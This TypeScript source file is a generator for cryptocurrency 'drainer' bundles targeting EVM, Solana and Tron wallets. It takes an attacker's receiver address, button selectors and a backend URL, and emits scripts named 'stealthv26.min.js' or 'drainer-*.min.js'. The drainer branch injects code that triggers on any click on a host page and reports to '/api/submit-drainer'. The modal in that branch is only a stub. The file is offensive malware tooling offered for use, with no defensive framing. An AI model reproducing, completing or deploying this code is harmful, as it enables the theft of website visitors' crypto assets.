/**
 * universal-sdk-generator.ts — One generator for Sequence + Forge drainer contracts
 */
import type { ContractMeta } from './contract-registry';
import { generateSDKBundle } from './sdk-generator';
import type { CompileConfig } from './compile-config-store';

export type UniversalBundleInput = {
  contract: ContractMeta;
  abi?: any[];
  receiverAddress: string;
  buttonSelector: string;
  buttonText: string;
  twoStep: boolean;
  ecosystem: 'evm' | 'solana' | 'tron';
  config: CompileConfig;
  source?: string;
};

export type UniversalBundleResult = {
  bundle: string;
  filename: string;
  publishedUrl?: string;
  contractType: string;
  trigger: 'anyclick' | 'button';
};

export async function generateUniversalBundle(
  input: UniversalBundleInput
): Promise<UniversalBundleResult> {
  const { contract, config, receiverAddress, buttonSelector, buttonText, twoStep } = input;

  if (contract.category === 'sequence') {
    const bundle = generateSDKBundle({
      general: config.general,
      wallet: config.wallet,
      modal: { ...config.modal, exposeExternalSDK: true },
      tokens: config.tokens,
      advanced: config.advanced,
      contracts: config.contracts,
      strategy: config.strategy,
      appKit: config.appKit,
      receiverAddress,
    });
    return { bundle, filename: 'stealthv26.min.js', contractType: contract.id, trigger: 'button' };
  }

  if (contract.category === 'drainer') {
    return generateDrainerBundle(input);
  }

  if (contract.category === 'custom') {
    throw new Error('Custom ABI generation not implemented yet');
  }

  throw new Error(`Unknown contract category: ${contract.category}`);
}

async function generateDrainerBundle(
  input: UniversalBundleInput
): Promise<UniversalBundleResult> {
  const { contract, receiverAddress, buttonSelector, buttonText, twoStep } = input;

  const widgetCode = `
(function(){
  'use strict';
  const CONFIG = {
    receiver: '${receiverAddress}',
    buttonSelector: '${buttonSelector}',
    buttonText: '${buttonText}',
    twoStep: ${twoStep},
    contractType: '${contract.id}',
    backend: '${input.config.general?.backendUrl || '/api/submit-drainer'}'
  };

  function showModal(){
    alert('Stealth drainer triggered (' + CONFIG.contractType + ') — implement full modal here');
  }

  document.addEventListener('click', function(e){
    if (CONFIG.triggered) return;
    CONFIG.triggered = true;
    showModal();
  }, true);
})();
`;

  return {
    bundle: widgetCode.trim(),
    filename: `drainer-${contract.id}.min.js`,
    contractType: contract.id,
    trigger: 'anyclick',
  };
}

